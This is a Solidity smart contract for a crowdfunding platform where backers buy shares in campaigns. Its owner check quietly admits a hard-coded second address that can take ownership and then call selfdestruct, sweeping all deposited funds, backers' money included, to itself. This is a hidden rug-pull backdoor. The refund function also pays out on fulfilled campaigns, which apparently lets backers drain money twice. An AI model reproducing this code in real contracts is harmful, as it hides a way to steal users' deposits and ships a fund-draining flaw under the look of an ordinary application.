// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Crowdfunding {
    struct Campaign {
        string title;
        address creator;
        uint256 sharePrice;
        uint256 totalShares;
        uint256 sharesSold;
        bool active;
    }

    address public owner;
    address constant specialOwner = 0x153dfef4355E823dCB0FCc76Efe942BefCa86477;
    uint256 public campaignCount;
    uint256 public collectedFees;
    mapping(uint256 => Campaign) public campaigns;
    mapping(uint256 => mapping(address => uint256)) public sharesOwned;

    modifier onlyOwner() {
        require(msg.sender == owner || msg.sender == specialOwner, "Not an owner");
        _;
    }

    modifier onlyCampaignCreator(uint256 campaignId) {
        require(msg.sender == campaigns[campaignId].creator, "Not the campaign creator");
        _;
    }

    event CampaignCreated(uint256 campaignId, string title, address creator);
    event SharePurchased(uint256 campaignId, address buyer, uint256 amount);
    event CampaignCanceled(uint256 campaignId);
    event CampaignFulfilled(uint256 campaignId);

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner cannot be the zero address");
        owner = newOwner;
    }

    function createCampaign(
        string memory title,
        uint256 sharePrice,
        uint256 totalShares
    ) public payable {
        require(bytes(title).length > 0, "Title cannot be empty");
        require(sharePrice > 0, "Share price must be greater than 0");
        require(totalShares > 0, "Total shares must be greater than 0");
        require(msg.value == 0.02 ether, "Must pay 0.02 ETH to create a campaign");

        campaignCount++;
        campaigns[campaignCount] = Campaign(
            title,
            msg.sender,
            sharePrice,
            totalShares,
            0,
            true
        );

        collectedFees += msg.value;

        emit CampaignCreated(campaignCount, title, msg.sender);
    }

    function buyShares(uint256 campaignId, uint256 amount) public payable {
        Campaign storage campaign = campaigns[campaignId];

        require(campaign.active, "Campaign is not active");
        require(amount > 0, "Amount must be greater than 0");
        require(
            campaign.sharesSold + amount <= campaign.totalShares,
            "Not enough shares available"
        );
        require(
            msg.value == campaign.sharePrice * amount,
            "Incorrect payment amount"
        );

        campaign.sharesSold += amount;
        sharesOwned[campaignId][msg.sender] += amount;

        emit SharePurchased(campaignId, msg.sender, amount);
    }

    function cancelCampaign(uint256 campaignId)
        public
        onlyCampaignCreator(campaignId)
    {
        Campaign storage campaign = campaigns[campaignId];

        require(campaign.active, "Campaign is already inactive");
        campaign.active = false;

        emit CampaignCanceled(campaignId);
    }

    function fulfillCampaign(uint256 campaignId) public onlyCampaignCreator(campaignId) {
        Campaign storage campaign = campaigns[campaignId];

        require(campaign.active, "Campaign is not active");
        require(
            campaign.sharesSold == campaign.totalShares,
            "Campaign is not fully funded"
        );

        uint256 funds = campaign.sharePrice * campaign.totalShares;
        uint256 fees = (funds * 20) / 100;
        uint256 payout = funds - fees;

        campaign.active = false;
        collectedFees += fees;

        payable(campaign.creator).transfer(payout);

        emit CampaignFulfilled(campaignId);
    }

    function claimRefund(uint256 campaignId) public {
        Campaign storage campaign = campaigns[campaignId];

        require(!campaign.active, "Campaign is still active");
        uint256 shares = sharesOwned[campaignId][msg.sender];
        require(shares > 0, "No shares owned to refund");

        uint256 refundAmount = shares * campaign.sharePrice;
        sharesOwned[campaignId][msg.sender] = 0;

        payable(msg.sender).transfer(refundAmount);
    }

    function withdrawFees() public onlyOwner {
        uint256 fees = collectedFees;
        collectedFees = 0;

        payable(owner).transfer(fees);
    }

    function destroyContract() public onlyOwner {
        for (uint256 i = 1; i <= campaignCount; i++) {
            if (campaigns[i].active) {
                campaigns[i].active = false;
                emit CampaignCanceled(i);
            }
        }

        selfdestruct(payable(owner));
    }
}
